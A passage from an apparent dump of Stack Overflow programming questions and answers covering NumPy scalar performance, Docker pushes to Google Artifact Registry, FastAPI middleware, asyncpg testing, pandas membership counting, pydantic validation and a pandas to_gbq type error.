b = np.random.randint(nnu_use,size=1)[0]

%timeit a + b                            # --&gt; 3.9 µs ± 19.9 ns per loop (mean ± std. dev. of 7 runs, 100000 loops each)
%timeit a + int(b)                       # --&gt; 2.87 µs ± 8.07 ns per loop (mean ± std. dev. of 7 runs, 100000 loops each)
</code></pre>
<hr />
<p>Note that the speed-up can be enormous (<strong>factor 50</strong>) for scalar-to-scalar-operations as well, as seen below:</p>
<pre><code>np.random.seed(100)

a = (np.random.rand(1))[0]
a_native = float(a)
b = complex(np.random.rand(1)+1j*np.random.rand(1))
c = (np.random.rand(1)+1j*np.random.rand(1))[0]
c_native = complex(c)

%timeit a * (b - b.conjugate() * c)                # 6.48 µs ± 49.7 ns per loop (mean ± std. dev. of 7 runs, 100000 loops each)
%timeit a_native * (b - b.conjugate() * c_native)  # 283 ns ± 7.78 ns per loop (mean ± std. dev. of 7 runs, 1000000 loops each)
%timeit a * b                                      # 5.07 µs ± 17.7 ns per loop (mean ± std. dev. of 7 runs, 100000 loops each)
%timeit a_native * b                               # 94.5 ns ± 0.868 ns per loop (mean ± std. dev. of 7 runs, 10000000 loops each)
</code></pre>
<hr />
<p><strong>Update:</strong> Could it be that the latest numpy release fixes the speed difference? The release notes of numpy <code>1.23</code> mention that scalar operations are now much faster, see <a href=""https://numpy.org/devdocs/release/1.23.0-notes.html#performance-improvements-and-changes"" rel=""nofollow noreferrer"">https://numpy.org/devdocs/release/1.23.0-notes.html#performance-improvements-and-changes</a> and <a href=""https://github.com/numpy/numpy/pull/21188"" rel=""nofollow noreferrer"">https://github.com/numpy/numpy/pull/21188</a>. I am using <code>python 3.7.6, numpy 1.21.2</code>.</p>
","73070306","<p>On my Windows PC with CPython 3.8.1, I get:</p>
<pre class=""lang-none prettyprint-override""><code>[Old] Numpy 1.22.4:
 - First test: 1.65 µs VS 1.43 µs
 - Second:     2.03 µs VS 0.17 µs

[New] Numpy 1.23.1:
 - First test: 1.38 µs VS 1.24 µs    &lt;----  A bit better than Numpy 1.22.4
 - Second:     0.38 µs VS 0.17 µs    &lt;----  Much better than Numpy 1.22.4
</code></pre>

<p>While the new version of Numpy gives a good boost, native type should always be faster than Numpy ones with the (default) CPython <strong>interpreter</strong>. Indeed, the interpreter needs to call C function of Numpy. This is not needed with native types. Additionally, the Numpy checks and wrapping is not optimal but Numpy is not designed for fast scalar computation in the first place (though the overhead was previously not reasonable). In fact, scalar computations are very inefficient and the interpreter prevent any fast execution.</p>
<p>If you plan to do many scalar operation you need to use a natively compiled code, possibly using Cython, Numba, or even a raw C/C++ module. Note that Cython do not optimize/inline Numpy calls but can operate on native types faster. A native code can do this certainly in one or even two order of magnitude less time.</p>
<p>Note that in the first case, the path in Numpy functions is not the same and Numpy does additional check that are a bit more expensive then the value is not a CPython object. Still, it should be a constant overhead (and now relatively small). Otherwise, it would be a bug (and should be reported).</p>
<p>Related: <a href=""https://stackoverflow.com/questions/69584027/why-is-np-sumrangen-very-slow/69587888#69587888"">Why is <code>np.sum(range(N))</code> very slow?</a></p>
"
"72251787","1","Permission ""artifactregistry.repositories.downloadArtifacts"" denied on resource","<p>While the artifact repository was successfully creating, running a docker push to push the image to the google artifact registry fails with a permissions error even after granting all artifact permissions to the accounting I am using on gcloud cli.</p>
<p><strong>Command used to push image:</strong></p>
<pre><code>docker push us-central1-docker.pkg.dev/project-id/repo-name:v2
</code></pre>
<p><strong>Error message:</strong></p>
<pre><code>The push refers to repository [us-central1-docker.pkg.dev/project-id/repo-name]
6f6f4a472f31: Preparing
bc096d7549c4: Preparing
5f70bf18a086: Preparing
20bed28d4def: Preparing
2a3255c6d9fb: Preparing
3f5d38b4936d: Waiting
7be8268e2fb0: Waiting
b889a93a79dd: Waiting
9d4550089a93: Waiting
a7934564e6b9: Waiting
1b7cceb6a07c: Waiting
b274e8788e0c: Waiting
78658088978a: Waiting
denied: Permission &quot;artifactregistry.repositories.downloadArtifacts&quot; denied on resource &quot;projects/project-id/locations/us-central1/repositories/repo-name&quot; (or it may not exist)


</code></pre>
","72255017","<p>I was able to recreate your use case. This happens when you are trying to push an image on a <code>repository</code> in which its specific hostname (associated with it's repository location) is not yet  added to the credential helper configuration for authentication. You may refer to this <a href=""https://cloud.google.com/artifact-registry/docs/docker/authentication"" rel=""noreferrer"">Setting up authentication for Docker </a> as also provided by @DazWilkin in the comments for more details.</p>
<p>In my example, I was trying to push an image on a repository that has a location of <code>us-east1</code> and got the same error since it is not yet added to the credential helper configuration.
<a href=""https://i.stack.imgur.com/NQeIf.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/NQeIf.png"" alt=""enter image description here"" /></a></p>
<p>And after I ran the authentication using below command (specifically for us-east1 since it is the <code>location</code> of my repository), the image was successfully pushed:</p>
<pre><code>gcloud auth configure-docker us-east1-docker.pkg.dev
</code></pre>
<p><a href=""https://i.stack.imgur.com/q2Q9x.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/q2Q9x.png"" alt=""enter image description here"" /></a></p>
<p><em><strong>QUICK TIP</strong></em>: You may  get your authentication command specific for your repository when you open your desired repository in the <a href=""https://console.cloud.google.com/artifacts"" rel=""noreferrer"">console</a>, and then click on the <code>SETUP INSTRUCTIONS</code>.
<a href=""https://i.stack.imgur.com/KBjqa.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/KBjqa.png"" alt=""enter image description here"" /></a></p>
"
"71187944","1","dlopen: libcrypt.so.1: cannot open shared object file: No such file or directory","<p>I use <a href=""https://endeavouros.com/"" rel=""nofollow noreferrer"">EndeavourOS</a> and have updated my system on February 17 2022 using</p>
<pre><code>sudo pacman -Syu
</code></pre>
<p>Eversince, when I run <code>docker-compose</code>, I get this error message:</p>
<blockquote>
<p>[4221] Error loading Python lib '/tmp/_MEIgGJQGW/libpython3.7m.so.1.0': dlopen: libcrypt.so.1: cannot open shared object file: No such file or directory</p>
</blockquote>
<p>Some forum threads suggested to reinstall docker-compose, which I did. I tried the following solution, but both without success:</p>
<p><a href=""https://stackoverflow.com/questions/58649177/python3-7-error-while-loading-shared-libraries-libpython3-7m-so-1-0"">Python3.7: error while loading shared libraries: libpython3.7m.so.1.0</a></p>
<p>How can I resolve this issue?</p>
","72563653","<p>The underlying issue here is that you use docker-compose instead of docker compose, which are two different binaries. docker-compose is also known as V1, and is deprecated since April 26, 2022. Since then, it does not receive updates or patches, other than high-severity security patches.</p>
<p>So, to fix your issue, use <code>docker compose</code> instead of <code>docker-compose</code>. If you compare <code>docker compose version</code> and <code>docker-compose version</code>, you will see that this uses the newer docker compose and runs without an issue.</p>
"
"71882419","1","FastAPI - How to get the response body in Middleware","<p>Is there any way to get the response content in a middleware?
The following code is a copy from <a href=""https://fastapi.tiangolo.com/tutorial/middleware/#other-middlewares"" rel=""noreferrer"">here</a>.</p>
<pre><code>@app.middleware(&quot;http&quot;)
async def add_process_time_header(request: Request, call_next):
    start_time = time.time()

    response = await call_next(request)

    process_time = time.time() - start_time
    response.headers[&quot;X-Process-Time&quot;] = str(process_time)
    return response
</code></pre>
","71883126","<p>The <code>response</code> body is an iterator, which once it has been iterated through, it cannot be re-iterated again. Thus, you either have to save all the iterated data to a <code>list</code> (or <code>bytes</code> variable) and use that to return a custom <a href=""https://fastapi.tiangolo.com/advanced/custom-response/#response"" rel=""nofollow noreferrer""><code>Response</code></a>, or initiate the iterator again. The options below demonstrate both approaches. In case you would like to get the <code>request</code> body inside the <code>middleware</code> as well, please have a look at <a href=""https://stackoverflow.com/a/73464007/17865804""><strong>this answer</strong></a>.</p>
<h2>Option 1</h2>
<p>Save the data to a <code>list</code> and use <a href=""https://github.com/encode/starlette/blob/88e9fc1411f6bd79131afa4a7d2f4dc576c8bf04/starlette/concurrency.py#L58"" rel=""nofollow noreferrer""><code>iterate_in_threadpool</code></a> to initiate the iterator again, as described <a href=""https://github.com/encode/starlette/issues/874#issuecomment-1027743996"" rel=""nofollow noreferrer"">here</a> - which is what <a href=""https://fastapi.tiangolo.com/advanced/custom-response/#streamingresponse"" rel=""nofollow noreferrer""><code>StreamingResponse</code></a> uses, as shown <a href=""https://github.com/encode/starlette/blob/master/starlette/responses.py#L223"" rel=""nofollow noreferrer"">here</a>.</p>
<pre class=""lang-py prettyprint-override""><code>from starlette.concurrency import iterate_in_threadpool

@app.middleware(&quot;http&quot;)
async def some_middleware(request: Request, call_next):
    response = await call_next(request)
    response_body = [chunk async for chunk in response.body_iterator]
    response.body_iterator = iterate_in_threadpool(iter(response_body))
    print(f&quot;response_body={response_body[0].decode()}&quot;)
    return response
</code></pre>
<p><strong>Note 1:</strong> If your code uses <code>StreamingResponse</code>, <code>response_body[0]</code> would return only the first <code>chunk</code> of the <code>response</code>. To get the entire <code>response</code> body, you should join that list of bytes (chunks), as shown below (<code>.decode()</code> returns a string representation of the <code>bytes</code> object):</p>
<pre class=""lang-py prettyprint-override""><code>print(f&quot;response_body={(b''.join(response_body)).decode()}&quot;)
</code></pre>
<p><strong>Note 2:</strong> If you have a <code>StreamingResponse</code> streaming a body that wouldn't fit into your server's RAM (for example, a response of 30GB), you may run into memory errors when iterating over the <code>response.body_iterator</code> (this applies to both options listed in this answer), <strong>unless</strong> you loop through <code>response.body_iterator</code> (as shown in Option 2), but instead of storing the chunks in an in-memory variable, you store it somewhere on the disk. However, you would then need to retrieve the entire response data from that disk location and load it into RAM, in order to send it back to the client (which could extend the delay in responding to the client even more)—in that case, you could load the contents into RAM in chunks and use <code>StreamingResponse</code>, similar to what has been demonstrated <a href=""https://stackoverflow.com/a/73843234/17865804"">here</a>, <a href=""https://stackoverflow.com/a/73672334/17865804"">here</a>, as well as <a href=""https://stackoverflow.com/a/73241648/17865804"">here</a>, <a href=""https://stackoverflow.com/a/74239367/17865804"">here</a> and <a href=""https://stackoverflow.com/a/73770074/17865804"">here</a> (in Option 1, you can just pass your iterator/generator function to <code>iterate_in_threadpool</code>). However, I would not suggest following that approach, but instead have such endpoints returning large streaming responses excluded from the middleware, as described in <a href=""https://stackoverflow.com/a/73464007/17865804"">this answer</a>.</p>
<h2>Option 2</h2>
<p>The below demosntrates another approach, where the response body is stored in a <code>bytes</code> object (instead of a list, as shown above), and is used to return a custom <a href=""https://fastapi.tiangolo.com/advanced/custom-response/#response"" rel=""nofollow noreferrer""><code>Response</code></a> directly (along with the <code>status_code</code>, <code>headers</code> and <code>media_type</code> of the original response).</p>
<pre class=""lang-py prettyprint-override""><code>@app.middleware(&quot;http&quot;)
async def some_middleware(request: Request, call_next):
    response = await call_next(request)
    response_body = b&quot;&quot;
    async for chunk in response.body_iterator:
        response_body += chunk
    print(f&quot;response_body={response_body.decode()}&quot;)
    return Response(content=response_body, status_code=response.status_code, 
        headers=dict(response.headers), media_type=response.media_type)
</code></pre>
"
"73072257","1","Resolve warning ""A NumPy version >=1.16.5 and <1.23.0 is required for this version of SciPy""?","<p>When I import SciPy or a library dependent on it, I receive the following warning message:</p>
<pre><code>UserWarning: A NumPy version &gt;=1.16.5 and &lt;1.23.0 is required for this version of SciPy (detected version 1.23.1
</code></pre>
<p>It's true that I am running NumPy version 1.23.1, however this message is a mystery to me since I am running SciPy version 1.7.3, which, according to <a href=""https://docs.scipy.org/doc/scipy/dev/toolchain.html"" rel=""noreferrer"">SciPy's documentation</a>, is compatible with NumPy &lt;1.24.0.</p>
<p>Anyone having this problem or know how to resolve it?</p>
<p>I am using Conda as an environment manager, and all my packages are up to date as far as I know.</p>
<ul>
<li>python: 3.9.12</li>
<li>numpy: 1.23.1</li>
<li>scipy: 1.7.3</li>
</ul>
<p>Thanks in advance if anyone has any clues !</p>
","73072455","<p>According to the setup.py file of the scipy 1.7.3, numpy is indeed <code>&lt;1.23.0</code>. As @Libra said, the docs must be incorrect. You can:</p>
<ol>
<li>Ignore this warning</li>
<li>Use scipy 1.8</li>
<li>Use numpy &lt; 1.23.0</li>
</ol>
<p><strong>Edit</strong>:</p>
<p>This is now fixed in the dev docs of scipy <a href=""https://scipy.github.io/devdocs/dev/toolchain.html"" rel=""nofollow noreferrer"">https://scipy.github.io/devdocs/dev/toolchain.html</a></p>
"
"72258087","1","unexpected keyword argument 'tenant_id' while accessing Azure Key Vault in Python","<p>I was trying to accessing my key vault, but I got always the same error:</p>
<pre><code>AppServiceCredential.get_token failed: request() got an unexpected keyword argument 'tenant_id'
ManagedIdentityCredential.get_token failed: request() got an unexpected keyword argument 'tenant_id'
</code></pre>
<p>This was the code I used in an Azure Machine Learning notebook, copied from the docs:</p>
<pre class=""lang-py prettyprint-override""><code>from azure.identity import ManagedIdentityCredential
from azure.keyvault.secrets import SecretClient

credential = ManagedIdentityCredential()
secret_client = SecretClient(vault_url=&quot;https://XXXX.vault.azure.net/&quot;, credential=credential)

secretName = 'test'
retrieved_secret = secret_client.get_secret(secretName) # here's the error
retrieved_secret
</code></pre>
<p>What is wrong? Could you help me?
Thank you in advance.</p>
","72262694","<p>This error is because of a bug that has since been fixed in <code>azure-identity</code>'s <code>ManagedIdentityCredential</code>. Key Vault clients in recent packages include a tenant ID in token requests to support cross-tenant authentication, but some <code>azure-identity</code> credentials didn't correctly handle this keyword argument until the bug was fixed in <a href=""https://github.com/Azure/azure-sdk-for-python/blob/main/sdk/identity/azure-identity/CHANGELOG.md#180-2022-03-01"" rel=""noreferrer"">version 1.8.0</a>. Installing <code>azure-identity</code>&gt;=1.8.0 should fix the error you're getting.</p>
<p>(Disclaimer: I work for the Azure SDK for Python)</p>
"
"71925980","1","cannot perform operation: another operation is in progress in pytest","<p>I want to test some function, that work with <code>asyncpg</code>. If I run one test at a time, it works fine. But if I run several tests at a time, all tests except the first one crash with the error <code>asyncpg.exceptions._base.InterfaceError: cannot perform operation: another operation is in progress</code>.</p>
<p>Tests:</p>
<pre><code>@pytest.mark.asyncio
async def test_project_connection(superuser_id, project_id):
    data = element_data_random(project_id)

    element_id = (await resolve_element_create(data=data, user_id=superuser_id))[&quot;id&quot;]
    project_elements = (await db_projects_element_ids_get([project_id]))[project_id]

    assert element_id in project_elements


@pytest.mark.asyncio
async def test_project_does_not_exist(superuser_id):
    data = element_data_random(str(uuid.uuid4()))

    with pytest.raises(ObjectWithIdDoesNotExistError):
        await resolve_element_create(data=data, user_id=superuser_id)
</code></pre>
<p>All functions for work with db use pool look like:</p>
<pre><code>async def &lt;some_db_func&gt;(*args):
    pool = await get_pool()

    await pool.execute(...) # or fetch/fetchrow/fetchval
</code></pre>
<p>How I get the pool:</p>
<pre><code>db_pool = None


async def get_pool():
    global db_pool

    async def init(con):
        await con.set_type_codec('jsonb', encoder=ujson.dumps, decoder=ujson.loads, schema='pg_catalog')
        await con.set_type_codec('json', encoder=ujson.dumps, decoder=ujson.loads, schema='pg_catalog')

    if not db_pool:
        dockerfiles_dir = os.path.join(src_dir, 'dockerfiles')
        env_path = os.path.join(dockerfiles_dir, 'dev.env')

        try:
            # When code and DB inside docker containers
            host = 'postgres-docker'
            socket.gethostbyname(host)
        except socket.error:
            # When code on localhost, but DB inside docker container
            host = 'localhost'

        load_dotenv(dotenv_path=env_path)

        db_pool = await asyncpg.create_pool(
            database=os.getenv(&quot;POSTGRES_DBNAME&quot;),
            user=os.getenv(&quot;POSTGRES_USER&quot;),
            password=os.getenv(&quot;POSTGRES_PASSWORD&quot;),
            host=host,
            init=init
        )  

    return db_pool
</code></pre>
<p>As far as I understand under the hood, <code>asynсpg</code> creates a new connection and runs the request inside that connection if you run the request through pool. Which makes it clear that each request should have its own connection. However, this error occurs, which is caused when one connection tries to handle two requests at the same time</p>
","71966226","<p>Okay, thanks to @Adelin I realized that I need to run each asynchronous test synchronously. I I'm new to <code>asyncio</code> so I didn't understand it right away and found a solution.</p>
<p>It was:</p>
<pre><code>@pytest.mark.asyncio
async def test_...(*args):
    result = await &lt;some_async_func&gt;

    assert result == excepted_result
</code></pre>
<p>It become:</p>
<pre><code>def test_...(*args):
    async def inner()
        result = await &lt;some_async_func&gt;

        assert result == excepted_result

    asyncio.get_event_loop().run_until_complete(inner())
</code></pre>
"
"73136808","1","AWS Glue error - Invalid input provided while running python shell program","<p>I have Glue job, a python shell code. When I try to run it I end up getting the below error.
<code>Job Name : xxxxx Job Run Id : yyyyyy failed to execute with exception Internal service error : Invalid input provided</code>
It is not specific to code, even if I just put</p>
<pre><code>import boto3
print('loaded')
</code></pre>
<p>I am getting the error right after clicking the run job option. What is the issue here?</p>
","73162640","<p>I think Quatermass is right, the jobs started working out of the blue the next day without any changes.</p>
"
"73242764","1","How to efficiently calculate membership counts by month and group","<p>I have to calculate in Python the number of unique active members by year, month, and group for a large dataset (N ~ 30M).  Membership always starts at the beginning of the month and ends at the end of the month. Here is a very small subset of the data.</p>
<pre><code>print(df.head(6))
   member_id  type  start_date    end_date
1         10     A  2021-12-01  2022-05-31
2         22     B  2022-01-01  2022-07-31
3         17     A  2022-01-01  2022-06-30
4         57     A  2022-02-02  2022-02-28
5         41     B  2022-02-02  2022-04-30
</code></pre>
<p>My current solution is inefficient as it relies on a for loop:</p>
<pre><code>import pandas as pd


date_list = pd.date_range(
    start=min(df.start_date),
    end=max(df.end_date),
    freq='MS'
)
members = pd.DataFrame()

for d in date_list:
    df['date_filter'] = (
        (d &gt;= df.start_date)
        &amp; (d &lt;= df.end_date)
    )
    grouped_members = (
         df
         .loc[df.date_filter]
         .groupby(by='type', as_index=False)
         .member_id
         .nunique()
    )
    member_counts = pd.DataFrame(
         data={'year': d.year, 'month': d.month}
         index=[0]
    )
     member_counts = member_counts.merge(
         right=grouped_members,
         how='cross'
    )
    members = pd.concat[members, member_counts]
members = members.reset_index(drop=True)
</code></pre>
<p>It produces the following:</p>
<pre><code>print(members)

    year  month  type  member_id
 0  2021     12     A          1
 1  2021     12     B          0
 2  2022      1     A          3
 3  2022      1     B          1
 4  2022      2     A          3
 5  2022      2     B          2
 6  2022      3     A          2
 7  2022      3     B          2
 8  2022      4     A          2
 9  2022      4     B          2
10  2022      5     A          2
11  2022      5     B          1
12  2022      6     A          1
13  2022      6     B          1
14  2022      7     A          0
15  2022      7     B          1
</code></pre>
<p>I'm looking for a completely vectorized solution to reduce computational time.</p>
","73243551","<p>Updated answer that avoids <code>melt</code>. Maybe faster? Uses the same idea as before where we don't actually care about member ids, we are just keeping track of start/end counts</p>
<pre><code>#Create multiindexed series for reindexing later
months = pd.date_range(
    start=df.start_date.min(),
    end=df.end_date.max(),
    freq='MS',
).to_period('M')

ind = pd.MultiIndex.from_product([df.type.unique(),months],names=['type','month'])

#push each end date to the next month
df['end_date'] += pd.DateOffset(1) 

#Convert the dates to yyyy-mm
df['start_date'] = df.start_date.dt.to_period('M')
df['end_date'] = df.end_date.dt.to_period('M')

#Get cumsum counts per type/month of start and ends 
gb_counts = (
    df.groupby('type').agg(
        start = ('start_date','value_counts'),
        end = ('end_date','value_counts'),
    )
    .reindex(ind)
    .fillna(0)
    .groupby('type')
    .cumsum()
    .astype(int)
)

counts = (gb_counts.start-gb_counts.end).unstack()
counts
</code></pre>
<p>ORIGINAL</p>
<p>Updated answer than works unless the same member_id/group has overlapping date ranges (in which case it double-counts)</p>
<p>The idea is to keep track of when the number of users changes per group instead of exploding out all months per user.</p>
<p>I think this should be very fast and I'm curious how it performs</p>
<p>Output</p>
<p><a href=""https://i.stack.imgur.com/ffI6W.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ffI6W.png"" alt=""enter image description here"" /></a></p>
<p>Code (looks long but is mostly comments)</p>
<pre><code>import pandas as pd
import itertools

#Load example data
import io #just for reading in your example table
df = pd.read_csv(
    io.StringIO(&quot;&quot;&quot;
0  member_id  type  start_date    end_date
1         10     A  2021-12-01  2022-05-31
2         22     B  2022-01-01  2022-07-31
3         17     A  2022-01-01  2022-06-30
4         57     A  2022-02-02  2022-02-28
5         41     B  2022-02-02  2022-04-30
&quot;&quot;&quot;),
    delim_whitespace=True,
    index_col=0,
    parse_dates=['start_date','end_date'],
).reset_index(drop=True)

#Create categorical index for reindexing and ffill
months = pd.date_range(
    start=df.start_date.min(),
    end=df.end_date.max(),
    freq='MS',
).to_period('M')

cat_ind = pd.Categorical(itertools.product(df.type.unique(),months))

#push each end date to the next month
df['end_date'] += pd.DateOffset(1) 

#Convert the dates to yyyy-mm
df['start_date'] = df.start_date.dt.to_period('M')
df['end_date'] = df.end_date.dt.to_period('M')

#Melt from:
#
#member_id | type | start_date |  end_date
#----------|------|------------|-----------
#       10 |   A  | 2021-12-01 | 2022-05-31
# ...
#
#to
#
# type | active_users | date
#----------------------------
#    A |   start_date | 2021-12-01
#    A |     end_date | 2022-05-31
# ...
df = df.melt(
    id_vars='type',
    value_vars=['start_date','end_date'],
    var_name='active_users',
    value_name='date',
).sort_values('date')

#Replace var column with +1/-1 for start/end date rows
#
# type | active_users | date
#----------------------------
#    A |            1 | 2021-12-01
#    A |           -1 | 2022-05-31
# ...
df['active_users'] = df.active_users.replace({'start_date':1,'end_date':-1})

#Sum within each type/date then cumsum the number of active users
df = df.groupby(['type','date']).sum().cumsum()

#Reindex to ffill missing dates
df = df.reindex(cat_ind).ffill().astype(int)

df.unstack()
</code></pre>
"
"72476094","1","pydantic.error_wrappers.ValidationError: 11 validation errors for For Trip type=value_error.missing","<p>Im getting this error with my pydantic schema, but oddly it is generating the object correctly, and sending it to the SQLAlchemy models, then it suddenly throws error for all elements in the model.</p>
<pre><code>response -&gt; id
  field required (type=value_error.missing)
response -&gt; date
  field required (type=value_error.missing)
response -&gt; time
  field required (type=value_error.missing)
response -&gt; price
  field required (type=value_error.missing)
response -&gt; distance
  field required (type=value_error.missing)
response -&gt; origin_id
  field required (type=value_error.missing)
response -&gt; destination_id
  field required (type=value_error.missing)
response -&gt; driver_id
  field required (type=value_error.missing)
response -&gt; passenger_id
  field required (type=value_error.missing)
response -&gt; vehicle_id
  field required (type=value_error.missing)
response -&gt; status
  field required (type=value_error.missing)
</code></pre>
<p>i must say that all the fields should have values. And the error trace do not references any part of my code so i dont even know where to debug. Im a noob in SQLAlchemy/pydantic</p>
<p>here are some parts of the code</p>
<pre><code>class Trip(BaseModel):
    id: int
    date: str
    time: str
    price: float
    distance: float
    origin_id: int
    destination_id: int
    driver_id: int
    passenger_id: int
    vehicle_id: int
    status: Status

    class Config:
        orm_mode = True
</code></pre>
<pre><code>class TripDB(Base):
    __tablename__ = 'trip'
    __table_args__ = {'extend_existing': True}
    id = Column(Integer, primary_key=True, index=True)
    date = Column(DateTime, nullable=False)
    time = Column(String(64), nullable=False)
    price = Column(Float, nullable=False)
    distance = Column(Float, nullable=False)
    status = Column(String(64), nullable=False)

    origin_id = Column(
        Integer, ForeignKey('places.id'), nullable=False)
    destination_id = Column(
        Integer, ForeignKey('places.id'), nullable=False)

    origin = relationship(&quot;PlaceDB&quot;, foreign_keys=[origin_id])
    destination = relationship(&quot;PlaceDB&quot;, foreign_keys=[destination_id])

    driver_id = Column(
        Integer, ForeignKey('driver.id'), nullable=False)
    vehicle_id = Column(
        Integer, ForeignKey('vehicle.id'), nullable=False)
    passenger_id = Column(
        Integer, ForeignKey('passenger.id'), nullable=False)
</code></pre>
<pre><code>def create_trip(trip: Trip, db: Session):
    origin = db.query(models.PlaceDB).filter(models.PlaceDB.id == trip.origin_id).first()
    destination = db.query(models.PlaceDB).filter(models.PlaceDB.id == trip.destination_id).first()
    db_trip = TripDB(
        id=(trip.id or None),
        date=trip.date or None, time=trip.time or None, price=trip.price or None, 

    distance=trip.distance or None, 
            origin_id=trip.origin_id or None, destination_id=(trip.destination_id or None), status=trip.status or None, 
            driver_id=trip.driver_id or None, passenger_id=trip.passenger_id or None, vehicle_id=trip.vehicle_id or None, origin=origin, destination=destination)
    try:
        db.add(db_trip)
        db.commit()
        db.refresh(db_trip)
        return db_trip

    except:
        return &quot;Somethig went wrong&quot;

</code></pre>
","72564863","<p>It seems like a bug on the pydantic model, it happened to me as well, and i was not able to fix it, but indeed if you just skip the type check in the route it works fine</p>
"
"71984449","1","How to add an extra middle step into a list comprehension?","<p>Let's say I have a <code>list[str]</code> object containing timestamps in <code>&quot;HH:mm&quot;</code> format, e.g.</p>
<pre><code>timestamps = [&quot;22:58&quot;, &quot;03:11&quot;, &quot;12:21&quot;]
</code></pre>
<p>I want to convert it to a <code>list[int]</code> object with the &quot;number of minutes since midnight&quot; values for each timestamp:</p>
<pre><code>converted = [22*60+58, 3*60+11, 12*60+21]
</code></pre>
<p>... but I want to do it in style and use a single list comprehension to do it. A (syntactically incorrect) implementation that I naively constructed was something like:</p>
<pre><code>def timestamps_to_minutes(timestamps: list[str]) -&gt; list[int]:
    return [int(hh) * 60 + int(mm) for ts in timestamps for hh, mm = ts.split(&quot;:&quot;)]
</code></pre>
<p>... but this doesn't work because <code>for hh, mm = ts.split(&quot;:&quot;)</code> is not a valid syntax.</p>
<p>What would be the valid way of writing the same thing?</p>
<p>To clarify: I can see a formally satisfying solution in the form of:</p>
<pre><code>def timestamps_to_minutes(timestamps: list[str]) -&gt; list[int]:
    return [int(ts.split(&quot;:&quot;)[0]) * 60 + int(ts.split(&quot;:&quot;)[1]) for ts in timestamps]
</code></pre>
<p>... but this is highly inefficient and I don't want to split the string twice.</p>
","71984511","<p>You could use an inner generator expression to do the splitting:</p>
<pre><code>[int(hh)*60 + int(mm) for hh, mm in (ts.split(':') for ts in timestamps)]
</code></pre>
<hr />
<p>Although personally, I'd rather use a helper function instead:</p>
<pre><code>def timestamp_to_minutes(timestamp: str) -&gt; int:
    hh, mm = timestamp.split(&quot;:&quot;)
    return int(hh)*60 + int(mm)

[timestamp_to_minutes(ts) for ts in timestamps]

# Alternative
list(map(timestamp_to_minutes, timestamps))
</code></pre>
"
"71563696","1","Pandas to_gbq() TypeError ""Expected bytes, got a 'int' object","<p>I am using the <code>pandas_gbq</code> module to try and append a dataframe to a table in Google BigQuery.</p>
<p>I keep getting this error:</p>
<blockquote>
<p>ArrowTypeError: Expected bytes, got a 'int' object.</p>
</blockquote>
<p>I can confirm the data types of the dataframe match the schema of the BQ table.</p>
<p>I found this post regarding Parquet files not being able to have mixed datatypes: <a href=""https://stackoverflow.com/questions/68826636/pandas-to-parquet-file"">Pandas to parquet file</a></p>
<p>In the error message I'm receiving, I see there is a reference to a Parquet file, so I'm assuming the <code>df.to_gbq()</code> call is creating a Parquet file and I have a mixed data type column, which is causing the error. The error message doesn't specify.</p>
<p>I think that my challenge is that I can't see to find which column has the mixed datatype - I've tried casting them all as strings and then specifying the table schema parameter, but that hasn't worked either.</p>
<p>This is the full error traceback:</p>
<pre><code>In [76]: df.to_gbq('Pricecrawler.Daily_Crawl_Data', project_id=project_id, if_exists='append')
ArrowTypeError                            Traceback (most recent call last)
&lt;ipython-input-76-74cec633c5d0&gt; in &lt;module&gt;
----&gt; 1 df.to_gbq('Pricecrawler.Daily_Crawl_Data', project_id=project_id, if_exists='append')

~\Anaconda3\lib\site-packages\pandas\core\frame.py in to_gbq(self, destination_table, 
project_id, chunksize, reauth, if_exists, auth_local_webserver, table_schema, location, 
progress_bar, credentials)
   1708         from pandas.io import gbq
   1709
-&gt; 1710         gbq.to_gbq(
   1711             self,
   1712             destination_table,

~\Anaconda3\lib\site-packages\pandas\io\gbq.py in to_gbq(dataframe, destination_table, project_id, chunksize, reauth, if_exists, auth_local_webserver, table_schema, location, progress_bar, credentials)
    209 ) -&gt; None:
    210     pandas_gbq = _try_import()
--&gt; 211     pandas_gbq.to_gbq(
    212         dataframe,
    213         destination_table,

~\Anaconda3\lib\site-packages\pandas_gbq\gbq.py in to_gbq(dataframe, destination_table, project_id, chunksize, reauth, if_exists, auth_local_webserver, table_schema, location, progress_bar, credentials, api_method, verbose, private_key)
   1191         return
   1192
-&gt; 1193     connector.load_data(
   1194         dataframe,
   1195         destination_table_ref,

~\Anaconda3\lib\site-packages\pandas_gbq\gbq.py in load_data(self, dataframe, destination_table_ref, chunksize, schema, progress_bar, api_method, billing_project)
    584
    585         try:
--&gt; 586             chunks = load.load_chunks(
    587                 self.client,
    588                 dataframe,

~\Anaconda3\lib\site-packages\pandas_gbq\load.py in load_chunks(client, dataframe, destination_table_ref, chunksize, schema, location, api_method, billing_project)
    235 ):
    236     if api_method == &quot;load_parquet&quot;:
--&gt; 237         load_parquet(
    238             client,
    239             dataframe,

~\Anaconda3\lib\site-packages\pandas_gbq\load.py in load_parquet(client, dataframe, destination_table_ref, location, schema, billing_project)
    127
    128     try:
--&gt; 129         client.load_table_from_dataframe(
    130             dataframe,
    131             destination_table_ref,

~\Anaconda3\lib\site-packages\google\cloud\bigquery\client.py in load_table_from_dataframe(self, dataframe, destination, num_retries, job_id, job_id_prefix, location, project, job_config, parquet_compression, timeout)
   2669                         parquet_compression = parquet_compression.upper()
   2670
-&gt; 2671                     _pandas_helpers.dataframe_to_parquet(
   2672                         dataframe,
   2673                         job_config.schema,

~\Anaconda3\lib\site-packages\google\cloud\bigquery\_pandas_helpers.py in dataframe_to_parquet(dataframe, bq_schema, filepath, parquet_compression, parquet_use_compliant_nested_type)
    584
    585     bq_schema = schema._to_schema_fields(bq_schema)
--&gt; 586     arrow_table = dataframe_to_arrow(dataframe, bq_schema)
    587     pyarrow.parquet.write_table(
    588         arrow_table, filepath, compression=parquet_compression, **kwargs,

~\Anaconda3\lib\site-packages\google\cloud\bigquery\_pandas_helpers.py in dataframe_to_arrow(dataframe, bq_schema)
    527         arrow_names.append(bq_field.name)
    528         arrow_arrays.append(
--&gt; 529             bq_to_arrow_array(get_column_or_index(dataframe, bq_field.name), bq_field)
    530         )
    531         arrow_fields.append(bq_to_arrow_field(bq_field, arrow_arrays[-1].type))

~\Anaconda3\lib\site-packages\google\cloud\bigquery\_pandas_helpers.py in bq_to_arrow_array(series, bq_field)
    288     if field_type_upper in schema._STRUCT_TYPES:
